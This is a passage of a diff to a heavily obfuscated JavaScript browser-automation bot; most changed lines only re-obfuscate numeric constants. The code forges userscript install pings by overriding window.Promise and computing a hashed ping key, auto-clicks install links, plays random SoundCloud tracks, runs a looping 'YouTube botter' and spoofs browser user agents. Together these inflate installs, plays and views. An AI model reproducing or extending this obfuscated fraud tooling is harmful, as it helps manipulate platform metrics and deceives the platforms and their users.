(-0x1aa2 + 0x24ab + -0xa06)] << -0x1c02 + -0x15f6 * 0x1 + 0x31f8) << -0x4c6 + -0x6a3 + 0xb6e | Y >>> 0x1 * 0x268d + -0x34a + -0x19 * 0x168) + (Z ^ (a0 = a0 << -0x5 * 0x606 + -0x13 * 0x1b7 + 0x3ed1 | a0 >>> 0x7c * -0x5 + 0xfb + -0x35 * -0x7) ^ a1) + X + (-0x1 * -0x3a3a6147 + 0x17 * 0x55a5e17 + 0x11 * -0x4259547) + a2[V + (-0x19 * 0xe7 + -0x16c0 + -0x29 * -0x11b)] << 0x16a8 + -0x9 * 0x457 + 0x1067, Z = Z << -0x1 * 0xb01 + -0x1842 + 0xbcb * 0x3 | Z >>> -0x413 + 0x1 * -0x17c9 + 0x1bde;
+                    for (; V < -0x7bf + -0x9 * -0x1eb + -0x948; V += -0x261c + 0xcf1 + -0x64c * -0x4)
+                      X = (W = (Y = (W = (Z = (W = (a0 = (W = (a1 = (W = X << 0xad6 * -0x2 + -0x1b92 + -0x1 * -0x3143 | X >>> -0x8 * -0x3b0 + -0x1065 + -0xd00) + (Y & Z | Y & a0 | Z & a0) + a1 - (0x2 * 0x63a7e31b + -0x73fcddc4 + 0x1d915ab2) + a2[V] << -0x46 * -0x2c + 0x1370 + 0x98 * -0x35) << -0x1da2 * -0x1 + -0x19 * -0x16 + -0x1 * 0x1fc3 | a1 >>> -0x726 + 0x173 * 0x11 + 0xb2 * -0x19) + (X & (Y = Y << -0x25b5 + 0xaaf + -0xd92 * -0x2 | Y >>> 0x216 + -0xe4a * 0x1 + 0xc36) | X & Z | Y & Z) + a0 - (-0xcbe3005f + 0x704e1229 * -0x2 + 0x21d6367d5 * 0x1) + a2[V + (-0x1e67 + -0x13d5 + 0x3 * 0x10bf)] << 0x23ee + 0x4d2 * 0x8 + -0x4a7e) << -0x56d + -0x64 * 0x3d + -0x6 * -0x4e1 | a0 >>> 0xa69 + -0x45d * -0x4 + 0xd1 * -0x22) + (a1 & (X = X << -0x132d * 0x1 + 0x1 * -0x1586 + 0x28d1 | X >>> 0xc * -0x25 + -0x56c * -0x1 + 0x2 * -0x1d7) | a1 & Y | X & Y) + Z - (-0x9003464 + 0xe0fb2878 + -0x10 * 0x6716b0f) + a2[V + (-0x2056 + 0x554 + 0x1b04)] << 0x5cb * 0x6 + 0xba2 + -0x1732 * 0x2) << -0x22d8 + -0x1b67 + 0x3e44 | Z >>> -0x3cb * -0x9 + 0x1278 + 0x10 * -0x348) + (a0 & (a1 = a1 << 0x1233 * -0x1 + 0x2483 + 0x2 * -0x919 | a1 >>> 0x1d53 + -0x251b + -0x1 * -0x7ca) | a0 & X | a1 & X) + Y - (-0x27cccfae + 0xcbd8c3aa + -0x3327b0d8) + a2[V + (-0x9ca + 0x238 * 0xb + -0xe9b)] << 0x2 * -0x4f9 + -0x1ec0 + -0x2 * -0x1459) << -0x432 * 0x1 + 0x1 * 0xd5f + -0x24a * 0x4 | Y >>> 0x116f + -0x7aa + -0x9aa) + (Z & (a0 = a0 << 0x10 * 0x8a + -0x17d * 0x16 + -0x234 * -0xb | a0 >>> -0x139c + 0x13 * -0x1f + 0x15eb) | Z & a1 | a0 & a1) + X - (0xcfae310a + -0x2dab7fbf + 0x7 * -0x70458e1) + a2[V + (-0x927 + 0x215e + -0x1833)] << 0x1c66 + 0x2 * -0x18d + -0x4 * 0x653, Z = Z << -0x9 * 0xd + -0x107d + 0x1110 | Z >>> 0x33 * 0x29 + 0x506 * 0x1 + -0xd2f;
+                    for (; V < 0x20a5 + -0x11e3 * 0x2 + 0x371; V += 0xbd7 * 0x3 + -0x1 * 0x220a + 0x16 * -0x11)
+                      X = (W = (Y = (W = (Z = (W = (a0 = (W = (a1 = (W = X << 0x3 * -0x3c4 + -0x9 * -0x255 + -0x9ac | X >>> 0x124 * 0x4 + 0x1afa + -0x1f6f) + (Y ^ Z ^ a0) + a1 - (0x2453a863 * 0x1 + 0x3f8a322d + -0x2e409c66) + a2[V] << 0xa23 + -0x2138 + -0x137 * -0x13) << 0x2282 + 0x1d * -0xdd + -0x974 | a1 >>> 0x1 * -0x2425 + 0x468 * 0x5 + 0xe38) + (X ^ (Y = Y << -0x1 * -0x3cf + -0x1c6a + -0x18b9 * -0x1 | Y >>> -0x1c0f + 0x1828 + 0x4d * 0xd) ^ Z) + a0 - (-0x9 * 0x8bc8119 + 0xd8935 * 0x3cb + 0x50e65c04) + a2[V + (-0x3 * 0x51b + 0x1d54 + 0x16 * -0xa3)] << -0x3d3 + -0x21a6 + 0x2579) << -0x3b1 + -0x1d83 + -0x3f * -0x87 | a0 >>> -0x1ea9 * 0x1 + 0x1 * 0x102f + 0x1 * 0xe95) + (a1 ^ (X = X << -0x1780 + 0x8ad + 0x33 * 0x4b | X >>> 0x3d * -0x2f + -0xbf * 0x17 + -0x2 * -0xe2f) ^ Y) + Z - (0x42 * -0x55bb13 + -0x61c350c + 0x51d3ae1c) + a2[V + (-0x2399 + 0x885 + 0x1b16)] << -0x2b3 * 0x1 + 0xbc8 + -0x915) << 0x2467 * -0x1 + 0x122c + 0x1240 | Z >>> -0x28e * 0xb + 0x1 * 0x248 + 0x19ed * 0x1) + (a0 ^ (a1 = a1 << 0xeab + -0x1203 + -0x2 * -0x1bb | a1 >>> -0x641 + 0x2fc * 0xb + -0x1a91) ^ X) + Y - (-0x5df478b1 + -0x1 * -0x673dd06f + 0x10efea * 0x29e) + a2[V + (-0x948 + -0xe08 + 0x1753)] << -0x1 * -0x3 + 0xbd8 + -0xbdb) << 0x1ddf + -0xcef * -0x3 + -0x44a7 | Y >>> -0x15 * 0xe + 0x257c + -0x243b) + (Z ^ (a0 = a0 << -0x15cb + -0x175 * -0xf + 0xe | a0 >>> -0x1a4 + -0x1 * 0x21f + 0x5 * 0xc1) ^ a1) + X - (0x1 * -0x3ebc64cb + -0x1d28 * 0x9875 + 0x85b6b63d) + a2[V + (0x387 + 0x182f * -0x1 + 0x14ac)] << -0x23d + 0x1cf3 * -0x1 + 0x4 * 0x7cc, Z = Z << 0x35 * 0xb1 + 0x1 * -0x22bf + 0x18 * -0x13 | Z >>> -0x1c77 + -0x443 + 0x20bc;
+                    this['h0'] = this['h0'] + X << 0x10 * 0x1 + -0x17 * -0x35 + -0x41 * 0x13, this['h1'] = this['h1'] + Y << 0x2 * -0x837 + -0x21f1 * -0x1 + 0x1183 * -0x1, this['h2'] = this['h2'] + Z << -0x1 * -0x66e + 0x82 * -0x22 + 0x92 * 0x13, this['h3'] = this['h3'] + a0 << 0x191a + 0x19a2 * -0x1 + -0x8 * -0x11, this['h4'] = this['h4'] + a1 << -0x266b + -0x1 * 0x50f + 0x2b7a;
                   }
                   ['hex']() {
                     this['finalize']();
@@ -1242,7 +1254,7 @@ const actions = [
                       X = this['h2'],
                       Y = this['h3'],
                       Z = this['h4'];
-                    return I[V >> -0x1855 + 0xdbc * 0x1 + -0x1 * -0xab5 & 0x1e41 + -0x1ce3 + -0x1 * 0x14f] + I[V >> 0xafa + -0x17 + -0x9 * 0x133 & -0x15d6 + 0x13 * 0x127 + 0x0] + I[V >> -0x11 * -0x20d + -0xbf * -0xb + 0x157f * -0x2 & -0x114f + 0x13 * -0x87 + 0x1b63] + I[V >> -0x1413 + 0x201 + 0x1222 & -0x25cf + 0x4ef + 0x20ef] + I[V >> -0x123e + -0x6 * -0x1bf + 0x7d0 & 0xb4f + 0x1 * 0xa7 + -0xbe7] + I[V >> -0x148 + -0x27 * 0x95 + -0x1 * -0x1803 & 0x2664 + -0x1 * -0x123b + -0x5a8 * 0xa] + I[V >> -0xe66 + -0xaa3 * 0x3 + 0xf71 * 0x3 & -0x1a90 + 0x1220 + 0x87f] + I[-0x74f + -0x6 * -0x200 + -0x4a2 & V] + I[W >> 0x10ab + 0x1b41 + -0x2bd0 & 0x227b + -0x56 * 0x1a + -0x8 * 0x336] + I[W >> 0x139f + -0x9d7 + -0x4d8 * 0x2 & -0x1f1a + -0x3 * -0x9aa + -0x3 * -0xb9] + I[W >> -0x71b * 0x1 + -0xf1 * 0xf + -0x12 * -0x12f & -0x2 * 0x59e + 0x435 * 0x9 + -0x1a92] + I[W >> -0x22ac + 0x1f * -0x12a + 0x46d2 & -0x26c5 + 0x2e * -0x46 + 0x3368] + I[W >> 0x41 * -0x39 + -0x399 * -0x3 + 0x3ba & 0x1 * 0x203d + -0x201a + 0xa * -0x2] + I[W >> -0x1875 + -0x1493 + -0x4 * -0xb44 & 0x1ae0 + 0x7 * -0xf4 + -0x1425] + I[W >> -0xac8 + -0x13df + 0x1eab & 0x1 * 0x1d6b + 0xdb8 + -0x2b14] + I[0x266 * -0xf + 0x9 * 0x26 + 0x22b3 & W] + I[X >> -0x6fd + -0x16b6 * 0x1 + 0x1dcf & -0x1 * -0xa49 + -0xcc8 + 0x28e * 0x1] + I[X >> 0x1ced * -0x1 + 0x22a6 * -0x1 + 0x3fab & 0x146d + -0x1 * -0x201b + -0x3479] + I[X >> 0xb31 * 0x3 + -0x3c3 + -0x1dbc & 0x857 + 0xb3 * 0x2e + 0x1439 * -0x2] + I[X >> 0x1 * 0x2500 + 0x11 + -0x1 * 0x2501 & 0x1 * -0xfe3 + 0x24f * -0xe + -0x4 * -0xc11] + I[X >> -0x206b + 0xb55 + -0x43a * -0x5 & -0x886 + -0x1bd6 + 0x246b] + I[X >> 0x23e4 + -0x72 * -0xd + 0x2 * -0x14d3 & 0x83 * -0x22 + 0x55c + -0xc19 * -0x1] + I[X >> 0x2c3 * 0xb + -0x1507 + 0xef * -0xa & 0x117 + 0xaf3 * -0x1 + -0x9eb * -0x1] + I[-0xfc9 + 0x1fe9 + -0x1011 & X] + I[Y >> -0x1 * 0x11ef + 0x2289 + -0x107e & 0x174 + 0x8fb + -0xa60] + I[Y >> -0x11e3 * -0x2 + 0x248e + -0x483c & 0xca * -0x10 + 0x80 * 0xd + -0x1 * -0x62f] + I[Y >> -0x135 * -0x7 + 0x15a0 + -0x1dff * 0x1 & 0x2449 + 0x1a * 0x49 + -0x2ba4] + I[Y >> -0x1c8b + -0x1be5 + 0x1c40 * 0x2 & -0x92 * 0x3 + -0x1 * -0x3fd + -0x238] + I[Y >> 0x25 * 0xdb + 0x11de + -0x5 * 0x9e5 & -0xa36 + -0x1 * 0x26d5 + 0x311a] + I[Y >> -0x2 * -0xc2f + 0x14 * -0x109 + 0x6 * -0x9b & 0xdf * -0x11 + -0x1 * -0x2ef + 0xbef] + I[Y >> 0x10a5 + -0x1 * -0x26b7 + -0x3758 & 0x394 * -0x1 + -0xa74 + 0xe17] + I[0x26c8 + 0x54f * -0x1 + -0x216a & Y] + I[Z >> 0x198c + -0x962 + -0x100e & -0x382 * 0x8 + -0x6d7 + 0x22f6] + I[Z >> 0x2 * -0x90e + -0x2479 * -0x1 + -0x1245 & 0x264d + 0xadb * -0x1 + 0x171 * -0x13] + I[Z >> -0x1174 + -0xca4 + 0x1e2c & 0x3 * 0x5ec + 0x17f1 + 0x6f1 * -0x6] + I[Z >> -0x1 * -0x1ec7 + -0x20d9 + -0x4e * -0x7 & -0x1c13 + -0x1 * 0xd + -0x27 * -0xb9] + I[Z >> 0x584 + -0x1 * -0x1b7d + 0x289 * -0xd & -0xe6b + 0x21e3 + -0x1369] + I[Z >> -0x1 * -0x136d + -0xe67 + -0x4fe & 0x1322 + 0x1ee5 + -0x31f8] + I[Z >> 0xdd * -0x1b + 0x24b8 + -0xd65 & 0x1f * -0x66 + -0xb32 + 0x179b] + I[-0x8 * 0x48a + 0xf4a + 0x1515 & Z];
+                    return I[V >> 0x400 + 0x1d31 + -0x2115 & 0x646 * 0x2 + 0x2f * 0x89 + -0x25a4] + I[V >> 0x683 + -0x113e + -0x11 * -0xa3 & -0x1ad8 * -0x1 + -0x894 + -0x1235] + I[V >> -0xc79 * 0x2 + 0x2239 * 0x1 + 0x933 * -0x1 & -0x2 * -0x15e + 0x2435 + -0x26e2] + I[V >> 0x1169 + 0xfd9 + -0x2132 & 0x1 * -0x12b7 + 0x19b2 + 0x1bb * -0x4] + I[V >> 0x1ed5 + -0x2561 + 0xd3 * 0x8 & 0x12d7 + -0x1d * 0x152 + 0x2 * 0x9c1] + I[V >> -0x23d6 + -0xf2b * -0x1 + 0x14b3 & -0x15fc + 0x1fcf + -0x9c4] + I[V >> 0x3f * -0x69 + -0x1f7 * -0x2 + -0x3 * -0x74f & -0x521 + -0x1a4d + 0x3 * 0xa7f] + I[0x107a + 0x13 * -0x18b + -0x1a * -0x7f & V] + I[W >> 0xcd4 + 0x1818 + -0x98 * 0x3e & 0x2563 + -0x16ed * 0x1 + -0xe67] + I[W >> 0x9 * -0x10b + 0x36d + 0x60e & -0x1949 + 0x1e2a + -0x4d2] + I[W >> -0x31 * 0xf + 0x1593 + -0x12a0 & -0x1b3 * -0x15 + 0x78e * -0x1 + -0xe09 * 0x2] + I[W >> -0x776 + -0x21ef + 0x2975 & 0x1b79 + -0xd49 + -0xe21] + I[W >> -0x30f + 0x40 * -0x84 + -0x9 * -0x403 & 0xfe3 + 0xb0a + 0x1 * -0x1ade] + I[W >> -0x142b + 0x1543 + 0x22 * -0x8 & -0x191a + 0x1c26 + 0x11 * -0x2d] + I[W >> 0xe5 * -0x7 + -0x1798 + 0x1ddf * 0x1 & -0xb * 0x2b4 + 0x247d + -0x6b2] + I[0x5 * 0x6e5 + -0x1 * -0x1f0f + -0x4179 & W] + I[X >> 0xf67 + -0x18c0 + -0x327 * -0x3 & 0xdb * -0x2 + 0xf * 0x76 + -0x525] + I[X >> -0x19c2 + -0x13c * 0x11 + 0xda * 0x37 & -0x16e5 + -0x2544 + 0x3c38] + I[X >> 0x655 * -0x2 + 0x1dd3 * 0x1 + 0x1 * -0x1115 & -0x10 * -0xa9 + -0x15d * -0xd + -0x1c3a] + I[X >> 0xa4 * -0x2c + 0x1aed + 0x153 & 0xa38 + -0x1305 * -0x2 + 0x55b * -0x9] + I[X >> -0x1 * -0x2597 + -0x1f2 * -0xd + -0x5 * 0xc91 & 0xe8b + 0x30e + -0x118a] + I[X >> 0x8d5 + -0x230e + -0x8f * -0x2f & -0x81c + 0x17 * -0x14b + -0x4 * -0x97a] + I[X >> 0x933 + 0x58f * 0x7 + -0x3018 & 0x2269 + -0x1 * -0x10ed + -0x3347 * 0x1] + I[-0x419 + -0x1f14 + -0xcd * -0x2c & X] + I[Y >> 0xa9a + 0x13a9 + -0x1e27 & 0x1b2b + 0x41f + -0x27 * 0xcd] + I[Y >> -0x1 * 0x202c + 0x139c + -0x28 * -0x51 & -0x5a * -0x31 + 0x219d + -0x208 * 0x19] + I[Y >> 0x3 * -0xcf3 + -0x5e + 0x7 * 0x59d & -0x92e + -0x1dba + 0x26f7] + I[Y >> 0xef + 0x676 + 0x1 * -0x755 & 0x223 + 0x553 * -0x5 + 0x188b] + I[Y >> -0xb7c + 0x4 * -0x5e9 + -0x8cb * -0x4 & -0x5e4 + 0x17b * 0x16 + -0x1a9f] + I[Y >> 0x1bbe + -0x2 * 0x211 + -0x1794 & 0x13ea * 0x1 + 0x25cf * 0x1 + -0x39aa] + I[Y >> -0x1 * -0x2665 + -0x172c + 0xe5 * -0x11 & -0x1540 + -0x59a + -0x53 * -0x53] + I[0x419 * -0x5 + -0x2336 + -0x1296 * -0x3 & Y] + I[Z >> -0xb05 + -0x21c + -0xd3d * -0x1 & 0xfab + 0xfc + 0x76 * -0x24] + I[Z >> -0x9 * -0x217 + -0xd * 0x112 + -0x4cd & 0x6 * -0x5bb + 0x3 * -0x15b + 0x2682] + I[Z >> 0x22d7 + 0x11 * 0x21d + -0x46b0 & 0x57f + 0x1b5 * 0x3 + 0x385 * -0x3] + I[Z >> -0x1d96 + 0x1e7f + -0xd9 & -0xbe9 * 0x2 + -0x11 * 0x6b + -0x4 * -0x7bf] + I[Z >> 0x1 * -0x1435 + 0x631 * 0x1 + -0x1 * -0xe10 & 0x1 * 0x62f + -0x1c77 * -0x1 + -0x2297] + I[Z >> -0x60 * 0xa + -0x93c + 0xd04 & -0x142 + 0x9d3 + -0x2d6 * 0x3] + I[Z >> -0x10ae + 0x5ae + 0xb04 & 0x1 * -0x922 + 0x1e90 + -0x1 * 0x155f] + I[0x12eb * 0x1 + -0x764 + -0x2de * 0x4 & Z];
                   }
                   ['digest']() {
                     this['finalize']();
@@ -1252,87 +1264,89 @@ const actions = [
                       Y = this['h3'],
                       Z = this['h4'];
                     return [
-                      V >> 0xc2 * -0x8 + 0xf7e + 0x956 * -0x1 & -0x123 + 0x1 * 0x269 + -0x47,
-                      V >> 0x492 + 0x966 + -0x28 * 0x59 & -0x25 * 0x33 + -0x4 * 0x6a + 0xa06 * 0x1,
-                      V >> 0x1bfa + 0x1f5f + -0x3b51 & 0x7ef * -0x4 + -0x711 * 0x3 + 0x35ee, -0x1c35 + -0x1bf7 + -0x5 * -0xb6f & V,
-                      W >> 0x6 * 0x3d4 + -0x223 + -0x1 * 0x14bd & 0x6cc + -0x371 * 0x2 + -0x115 * -0x1,
-                      W >> -0x1149 + -0x3ec * 0x4 + 0x2109 * 0x1 & 0x1 * 0x15a2 + -0x3 * 0x647 + -0x1ce,
-                      W >> 0x1 * -0x2637 + 0x543 + 0x20fc * 0x1 & -0x2 * 0xb67 + 0x191 * 0x8 + -0x241 * -0x5, -0xdf5 * -0x1 + -0x26 * 0x8a + -0xd6 * -0x9 & W,
-                      X >> 0x1036 + 0x152 + -0x1170 & -0x913 * -0x1 + 0x22fd + -0x2b11,
-                      X >> 0x1 * -0xae5 + 0x1898 + 0x1 * -0xda3 & -0xdd1 + 0x1 * -0x26d7 + 0x35a7 * 0x1,
-                      X >> 0x1015 * -0x1 + -0x55f * -0x6 + 0x21 * -0x7d & 0x95 * 0x3b + 0x391 * -0x5 + 0x1 * -0xf83, -0x169 * -0xe + -0x669 + -0xc56 & X,
-                      Y >> -0x2168 + 0x17 * -0x4 + 0x21dc * 0x1 & 0xd61 * 0x1 + 0x23d4 + -0x3036,
-                      Y >> -0x2e3 * 0x9 + -0x25e5 + 0x3ff0 & 0x65d * 0x1 + -0x1 * -0x926 + -0x4 * 0x3a1,
-                      Y >> 0x1 * -0x1f8c + -0xc9 * -0x23 + -0x1 * -0x419 & -0x2 * 0x12b7 + 0xbce + -0x5 * -0x553,
-                      0x1e6c + 0x1724 + -0x3491 * 0x1 & Y,
-                      Z >> -0xa * 0x4 + 0x152 * 0x19 + 0xe * -0x257 & -0x1763 + -0x10b7 + -0x491 * -0x9,
-                      Z >> 0x1c37 + -0x434 * -0x1 + -0x205b & 0x3d1 * 0x6 + -0x18cd + 0x2e6,
-                      Z >> -0x1a68 * 0x1 + -0x1ebb + 0x1 * 0x392b & -0x808 * -0x2 + 0xb83 + -0x1a94,
-                      0x4 * 0x791 + 0xeac + -0x2bf1 & Z
+                      V >> -0x1 * 0x1a83 + 0x1d94 + 0x1 * -0x2f9 & 0x223 * 0xd + -0x4 * -0x781 + -0x38cc,
+                      V >> 0x1b * -0x29 + 0x1 * -0x124a + 0x16ad & 0x1af2 + 0x301 * -0x3 + -0x10f0,
+                      V >> -0x2439 * -0x1 + 0x411 + -0x2842 & 0x21b2 + -0x81d * -0x1 + 0x28d * -0x10,
+                      0x3f4 + -0x2544 + -0x1 * -0x224f & V,
+                      W >> 0x235d + 0xe93 + 0x244 * -0x16 & -0xf9e * 0x1 + 0x14da + -0x23 * 0x1f,
+                      W >> 0x1a13 + 0x365 + -0x1d68 & -0x25ab + -0x1cd0 + -0xb3f * -0x6,
+                      W >> 0xd * -0x4a + 0x2486 + 0x1a3 * -0x14 & 0x1713 + -0xbd3 + 0x23 * -0x4b, -0x67 * -0x44 + -0xe16 + -0x7 * 0x1c1 & W,
+                      X >> 0x174b * -0x1 + 0x6 * 0x1c0 + -0xce3 * -0x1 & -0xfd0 + -0x5b4 + 0x1683,
+                      X >> 0x23f8 + -0x8 * -0x231 + 0x5a * -0x98 & 0x1 * -0x198d + -0x1807 * 0x1 + 0x3293,
+                      X >> -0x2615 + 0x64b * -0x1 + 0x2c68 & 0xa4 * 0x14 + -0x1 * -0x1cf8 + -0x28c9,
+                      0x4d6 + 0xac9 * 0x2 + 0x1969 * -0x1 & X,
+                      Y >> -0x1d50 + 0x1a44 + 0x324 & -0x21f0 + 0x5c + 0x35 * 0xa7,
+                      Y >> -0x1 * -0x13e4 + -0x20ee + 0x68d * 0x2 & -0x16b7 + -0x187 * 0xe + 0x2d18,
+                      Y >> -0x2567 * 0x1 + -0x16c9 + 0x4 * 0xf0e & -0x2315 + 0x1db3 * 0x1 + 0x661, -0x1cea * 0x1 + 0x3c0 + 0x25 * 0xb5 & Y,
+                      Z >> 0x23a6 + -0x7 * -0x19b + -0x21 * 0x16b & -0x121b + -0x45b * 0x5 + -0x5 * -0x82d,
+                      Z >> 0x9bd + -0x215 * 0xd + 0x2 * 0x8b2 & 0xb * 0x18d + 0x17b * -0xb + 0x39,
+                      Z >> 0x238f + -0x1486 + -0xf01 & -0x1 * -0x184f + 0x5a8 * -0x2 + -0xc00,
+                      0x16b4 + -0x16f0 + -0x69 * -0x3 & Z
                     ];
                   }
                   ['arrayBuffe' + 'r']() {
                     var V, W;
-                    return this['finalize'](), V = new ArrayBuffer(-0x34 * -0x79 + 0x5 * -0x555 + 0x7 * 0x4f), (W = new DataView(V))['setUint32'](-0x1bd7 + -0x1c84 + 0x385b, this['h0']), W['setUint32'](-0x1dcd + -0x1 * 0x161e + 0x33ef, this['h1']), W['setUint32'](0x1add + 0x4 * -0x454 + -0x985, this['h2']), W['setUint32'](-0x442 + 0x1f8 + -0x1 * -0x256, this['h3']), W['setUint32'](-0x2e4 + 0xb * -0x227 + -0x11 * -0x191, this['h4']), V;
+                    return this['finalize'](), V = new ArrayBuffer(0xe2 * 0x1 + 0x100b + -0x10d9), (W = new DataView(V))['setUint32'](-0x24f7 + 0x2b9 * -0x5 + 0x3294, this['h0']), W['setUint32'](-0x889 + 0x318 + 0x7f * 0xb, this['h1']), W['setUint32'](-0x13f8 + -0xf44 + 0x2344, this['h2']), W['setUint32'](0x10e + -0x46 * 0x2a + 0xa7a, this['h3']), W['setUint32'](-0x109a + 0x13ee * 0x1 + -0x344, this['h4']), V;
                   }
               }
               S['prototype']['toString'] = S['prototype']['hex'], S['prototype']['array'] = S['prototype']['digest'];
               const T = O();
               window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
-              let U = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[0x1b3 + 0x2675 + -0x2828];
+              let U = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[0x10d * 0x5 + -0x7f7 * 0x3 + -0x1 * -0x12a4];
               return window['Promise'] = class extends window['Promise'] {
                 constructor(...V) {
-                  let W = -0x1721 + 0x56f + 0x11b2;
-                  V[-0x27c + -0x185 * 0xb + -0x3d7 * -0x5]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (V[0x48 * -0x17 + 0xbcf * 0x1 + -0x557] = X => {
+                  let W = -0x1e0f * 0x1 + -0x2 * 0x4c9 + 0x5 * 0x7ed;
+                  V[0x1453 + -0x298 * 0x1 + -0x11bb]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (V[0x1444 + 0x176f + 0x1 * -0x2bb3] = X => {
                     let Y = U['getAttribu' + 'te']('data-ping-' + 'url');
                     if (Y) {
                       let Z = T(U['getAttribu' + 'te']('data-ip-ad' + 'dress') + U['getAttribu' + 'te']('data-scrip' + 't-id') + U['getAttribu' + 'te']('data-ping-' + 'key')),
                         a0 = new XMLHttpRequest();
-                      a0['open']('POST', Y + ('&mo=3&ping' + '_key=') + encodeURIComponent(Z), -0x66 * -0x42 + 0x771 + -0x21bc), a0['overrideMi' + 'meType']('text/plain'), a0['onload'] = () => {}, a0['send'](), W = -0x1b36 + -0x270f + 0x4246;
+                      a0['open']('POST', Y + ('&mo=3&ping' + '_key=') + encodeURIComponent(Z), 0x933 + 0x87 + -0x9b9), a0['overrideMi' + 'meType']('text/plain'), a0['onload'] = () => {}, a0['send'](), W = 0x1ef4 + 0x4 * 0x8f2 + -0xb * 0x611;
                     }
                   }), W || super(...V);
                 }
               }, window['setTimeout'](() => {
                 U['click']();
-              }, 0x17c7 * 0x1 + -0x2d4 * 0x4 + -0x69b), Promise['resolve'](-0x1abc + 0x2705 + -0x18 * 0x83);
+              }, 0x2575 + -0x9e6 * -0x1 + -0x297f), Promise['resolve'](-0x238a + 0xd7b + 0x8 * 0x2c2);
             }), await wait(NETWORK_PATIENCE), await D['goto']('https://bl' + 'ank.org'), C()));
           }
           if (flags['RPL2_SC2']) {
-            let I = -0x738 + 0x4d8 + 0x260;
+            let I = -0x1e6e + 0x10f3 * -0x1 + 0x2f61;
             if (await D['goto'](data['soundcloud' + 'Tracks']['random'](), {
                 'timeout': NETWORK_PATIENCE
               })['catch'](J => I++), I)
               return await D['goto']('https://bl' + 'ank.org'), C();
             try {
               await D['evaluate'](() => {
-                let K = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
+                const ac = b;
+                let K = document['querySelec' + 'tor']('#content\x20>' + ac(0x9, 'OcU2') + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
                 K && 'Play' === K['textConten' + 't'] && (K['id'] = '______hook' + '5');
               });
               let J = await D['$']('#______hoo' + 'k5');
-              J && await f('#______hoo' + 'k5', 0x1b9 + 0x7 * 0x460 + -0x2058, D), await wait(-0xeda3 + 0x16 * 0x145 + 0xf * 0x19b3 + getRandomInt(0x4fd4 + -0x19a6 + 0x46a, -0x4 * 0x4b3 + -0xbe36 + 0xa319 * 0x2));
+              J && await f('#______hoo' + 'k5', -0xefd * 0x1 + -0x244a + 0x3348, D), await wait(0xbb6 * 0x1 + 0x8113 * -0x1 + -0x1 * -0x12525 + getRandomInt(-0x2 * -0x269f + -0x75 * 0x17 + -0x1 * 0x823, 0x5f11 + 0x892 * -0x2 + 0x2743));
             } catch (K) {}
             return await D['goto']('https://bl' + 'ank.org'), C();
           }
-          return warn('no\x20action\x20' + 'chosen...'), setTimeout(C, 0xb5a + 0x115 * 0x14 + -0x141 * 0x1a);
+          return warn('no\x20action\x20' + 'chosen...'), setTimeout(C, 0x161e + 0xa0d + 0x5 * -0x65b);
         }
         const D = await w['newPage']();
         C();
-      }, -0x615 * 0x4 + 0x524 + 0x166 * 0xe) : flags['RPL2_YT'] && async function C() {
+      }, 0x1420 + -0x5 * 0x2cd + -0x5bb) : flags['RPL2_YT'] && async function C() {
         const D = await h('https://ww' + 'w.youtube.' + 'com/');
         for (;;) {
-          let E = -0x5 * 0x134 + 0x53 * -0x7 + 0x849 * 0x1;
+          let E = 0xb15 * -0x2 + -0xae3 + 0x210d;
           try {
             await i(D), await y['random']()(D);
           } catch (F) {
-            log((E = -0x16c8 + 0x2dd + 0x13ec, F)), await D['close'](), setTimeout(() => {
+            log((E = -0x168c + 0x26f9 + -0x2 * 0x836, F)), await D['close'](), setTimeout(() => {
               C();
-            }, -0x2695 + -0xc4f * -0x3 + 0x20c);
+            }, -0x11c4 + -0x16e8 + -0x4 * -0xa44);
           }
           if (E)
-            return warn('YouTube\x20bo' + 'tter\x20died.' + '..'), -0xb5 * -0x1c + 0xd5e + 0x1 * -0x2129;
+            return warn('YouTube\x20bo' + 'tter\x20died.' + '..'), 0x1 * 0xc6d + -0x1 * -0x20a4 + 0xb44 * -0x4;
           await randomWait();
         }
-        return -0x24cf + -0x407 * 0x8 + 0x4508;
+        return -0x323 + -0x824 + 0xb48;
       }();
     }
   ],
@@ -1340,16 +1354,15 @@ const actions = [
     () => flags['doCreateSe' + 'rver'],
     async () => {
       require('http')['createServ' + 'er'](async function(f, g) {
-        g['writeHead'](0x1e7e + 0x132 + -0x1ee8), g['write']('v0.8'), g['end']();
-      })['listen'](process['env']['PORT'] || 0x1e4b + 0x2c * 0x4e + -0xc23);
+        g['writeHead'](0x21fa + 0x2426 + -0x1156 * 0x4), g['write']('v0.8'), g['end']();
+      })['listen'](process['env']['PORT'] || -0x3 * 0x977 + 0x71e * 0x8 + 0x1 * 0x305);
     }
   ],
   [
     () => flags['doOUJS'],
     async () => {
       async function f() {
-        const ab = c,
-          h = data['oujsToAssi' + 'st']['random'](),
+        const h = data['oujsToAssi' + 'st']['random'](),
           j = h['replace']('/scripts/', '/install/') + '.user.js',
           [k, m] = (function() {
             const x = data['oujsUAs']['random']();
@@ -1358,16 +1371,16 @@ const actions = [
               x['includes']('Firefox')
             ];
           }()),
-          p = function(x, y = 0x1 * 0xffb + 0x1 * -0x24a3 + 0x14a9) {
+          p = function(x, y = 0xc2f * 0x2 + 0x260b + 0xf9a * -0x4) {
             if (x['includes']('Firefox'))
-              return x['slice'](x['indexOf']('Firefox') + 'Firefox' ['length'] + (0x86f * 0x1 + -0x1381 * 0x1 + -0xf * -0xbd));
